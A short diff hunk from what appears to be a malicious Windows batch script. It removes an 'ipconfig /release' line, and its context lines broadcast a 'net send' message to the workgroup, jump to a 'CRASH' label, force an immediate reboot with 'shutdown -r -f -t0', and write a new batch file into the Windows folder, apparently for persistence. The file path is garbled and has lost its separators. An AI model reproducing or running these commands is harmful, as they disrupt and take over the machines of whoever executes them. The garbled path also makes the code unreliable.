@@ -105,8 +105,6 @@ net send * WORKGROUP ENABLED
 
 GOTO CRASH
 
-ipconfig /release
-
 shutdown -r -f -t0
 
 echo @echo off>c:windowshartlell.bat
